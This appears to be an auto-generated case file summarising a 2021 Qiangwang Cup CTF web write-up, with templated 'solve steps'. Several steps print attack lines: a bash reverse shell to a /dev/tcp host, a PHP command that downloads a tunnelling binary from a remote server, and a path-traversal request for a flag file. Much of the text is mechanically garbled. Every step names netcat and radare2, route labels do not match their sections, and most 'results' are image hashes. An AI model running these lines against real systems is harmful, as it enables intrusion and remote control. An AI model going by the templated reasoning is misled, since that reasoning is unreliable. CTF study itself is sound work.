# 2021强网杯Write-Up真题解析之WEB部分（暴力干货，建议收藏）_代码熬夜敲的博客-CSDN博客_强网杯题目

## Case Metadata

- Category: `Web`
- Platform: `2021强网杯Write`
- Difficulty: `unknown`
- Source repository: `https://github.com/apachecn/apachecn-ctf-wiki`
- Source commit: `762ca130572c95196cf120e5f4ad5fbdd88b1b93`
- Source file: `docs/2021强网杯Write-Up真题解析之WEB部分（暴力干货，建议收藏）_代码熬夜敲的博客-CSDN博客_强网杯题目.md`
- Source URL: `https://github.com/apachecn/apachecn-ctf-wiki/blob/762ca130572c95196cf120e5f4ad5fbdd88b1b93/docs/2021%E5%BC%BA%E7%BD%91%E6%9D%AFWrite-Up%E7%9C%9F%E9%A2%98%E8%A7%A3%E6%9E%90%E4%B9%8BWEB%E9%83%A8%E5%88%86%EF%BC%88%E6%9A%B4%E5%8A%9B%E5%B9%B2%E8%B4%A7%EF%BC%8C%E5%BB%BA%E8%AE%AE%E6%94%B6%E8%97%8F%EF%BC%89_%E4%BB%A3%E7%A0%81%E7%86%AC%E5%A4%9C%E6%95%B2%E7%9A%84%E5%8D%9A%E5%AE%A2-CSDN%E5%8D%9A%E5%AE%A2_%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%A2%98%E7%9B%AE.md`
- Local source mirror: `sources/apachecn-apachecn-ctf-wiki/repo/docs/2021强网杯Write-Up真题解析之WEB部分（暴力干货，建议收藏）_代码熬夜敲的博客-CSDN博客_强网杯题目.md`

## Why This Case Matters

Use this case as a Web reference for binary, ciphertext, stego-media challenges.

## Input Signals

- Artifacts: binary, ciphertext, stego-media, web-app
- Tools: netcat, radare2
- Techniques: binary-exploitation, classical-crypto, command-injection, crypto-analysis, deserialization, encoding-analysis, file-inclusion, file-upload, http-analysis, php-tricks, ret2libc, sql-injection, ssti, web-exploitation

## First-Principles Route

- Identify the exposed entry point, reflected behavior, trust boundary, and any explicit hints or blacklists.
- Validate the suspected primitive with the smallest payload that proves code/data/control influence.
- Chain the primitive into file read, code execution, auth bypass, or state manipulation only after recording the bypass condition.

## Linked Assets

- Referenced assets: `16`
- `docs/img/4f9fd6db5ae0558d024401d11395267b.png`
- `docs/img/553ec6a4dc72766e929c27158ef87e92.png`
- `docs/img/b01099935d5c65b6e80c2e1de348c1fb.png`
- `docs/img/5bd336fac4309cf20101d6aa5bc73359.png`
- `docs/img/ec1f737562c4d6ce5bd7270d96a409df.png`
- `docs/img/6ae3a2f943f9ac014ec7d5b02510524a.png`
- `docs/img/79cc529a7677ce24fc4c86d6924493a8.png`
- `docs/img/c8c5c91c687767fc42ddd2c37ab124bb.png`
- `docs/img/a606886e87e419b5651026abbed565b3.png`
- `docs/img/74b7dee5f7c9efcbfd64b2b5d3843e0a.png`
- `docs/img/35f33fc43faeb31e4400fd4783e59c66.png`
- `docs/img/6388b1296aaba3389a7e967df9b3bdac.png`
- ... and `4` more

## Solve Thinking

### Step 1: Document

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `-->`

### Step 2: 2021强网杯Write-Up真题解析之WEB部分（暴力干货，建议收藏）_代码熬夜敲的博客-CSDN博客_强网杯题目

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `> 来源：[https://blog.csdn.net/MachineGunJoe/article/details/117955863](https://blog.csdn.net/MachineGunJoe/article/details/117955863)`

### Step 3: 前言：

- Route type: `sql injection exploitation`
- Why: SQLi cases are cheapest when the injection style is classified early and every response difference is recorded.
- Probe: Use netcat, radare2 to confirm injection context, then narrow to the cheapest boolean, union, error, or stacked route that leaks proof.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as sql injection exploitation.
  - Use netcat, radare2 to confirm injection context, then narrow to the cheapest boolean, union, error, or stacked route that leaks proof.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `553ec6a4dc72766e929c27158ef87e92`

### Step 4: **比赛信息**

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `b01099935d5c65b6e80c2e1de348c1fb`

### Step 5: **Hard_Penetration**

- Route type: `deserialization chain`
- Why: Deserialization cases usually reduce to identifying a controllable object graph and one executable magic-method sink.
- Probe: Use netcat, radare2 to confirm object injection and map the gadget or magic-method path before building the final payload.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as deserialization chain.
  - Use netcat, radare2 to confirm object injection and map the gadget or magic-method path before building the final payload.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `bash -c 'bash -i >/dev/tcp/vps/port 2>&10>&1'`

### Step 6: php上传ew：

- Route type: `http evidence extraction`
- Why: HTTP questions usually reduce to request metadata, response body, host/URI correlation, or object extraction.
- Probe: Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as http evidence extraction.
  - Use netcat, radare2 to inspect HTTP requests, hosts, URIs, headers, and response bodies.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `php -r "file_put_contents('ew',file_get_contents('http://xps/ew_linux_x64'));"`

### Step 7: 转发端口：

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `127.0.0.1`

### Step 8: 任意文件读拿flag：

- Route type: `ssti exploitation`
- Why: SSTI cases should prove evaluation first, then turn blacklist details into object-traversal or file-read pivots.
- Probe: Use netcat, radare2 to validate template evaluation with the smallest safe expression, then extend toward controlled object traversal or file read.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as ssti exploitation.
  - Use netcat, radare2 to validate template evaluation with the smallest safe expression, then extend toward controlled object traversal or file read.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `/wap/common/show?templateFile=../../../../../../flag`

### Step 9: **pop_master**

- Route type: `netcat-driven evidence lookup`
- Why: For Web, keep every answer tied to one artifact, one probe, and one proof field.
- Probe: Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as netcat-driven evidence lookup.
  - Use netcat, radare2 to collect the smallest evidence slice that answers the goal.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `5bd336fac4309cf20101d6aa5bc73359`

### Step 10: **16万行代码，从12点看到3点，就硬看：**

- Route type: `file inclusion exploitation`
- Why: Inclusion cases usually start with path control and end with wrapper, traversal, or source disclosure pivots.
- Probe: Use netcat to verify controllable include/read paths and then test the shortest local or wrapper-based read primitive.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as file inclusion exploitation.
  - Use netcat to verify controllable include/read paths and then test the shortest local or wrapper-based read primitive.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `class.php`

### Step 11: **Exp：**

- Route type: `command execution path`
- Why: Command execution routes should separate syntax proof, filter bypass, and final file-read or shell step.
- Probe: Use netcat to verify command execution or shell expansion with a tiny proof command before reading the target file.
- Tools: netcat
- Reasoning chain:
  - Recognize the section as command execution path.
  - Use netcat to verify command execution or shell expansion with a tiny proof command before reading the target file.
  - Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Evidence rule: Treat the extracted answer as proven only after locating the source artifact field that produced it.
- Result: `ec1f737562c4d6ce5bd7270d96a409df`

### Step 12: **[强网先锋]赌徒**

- Route type: `deserialization chain`
- Why: Deserialization cases usually reduce to identifying a controllable object graph and one executable magic-method sink.
- Probe: Use netcat, radare2 to confirm object injection and map the gadget or magic-method path before building the final payload.
- Tools: netcat, radare2
- Reasoning chain:
  - Recognize the section as deserialization chain.
  - Use netcat, radare2 to confirm object injection and map the gadget or magic-method path before building the final payload.
  - Trust the result only when the extracted evidence line or field directly supports it.
- Evidence rule: Trust the result only when the extracted evidence line or field directly supports it.
- Result: `6ae3a2f943f9ac014ec7d5b02510524a`

## Reuse Checklist

- Match the new challenge's artifact and question shape against this case before copying any tool sequence.
- Start from the same evidence class, then adapt filters, fields, and timestamps to the new artifact.
- Promote any repeated manual action into a skill command before relying on it for the final solve.
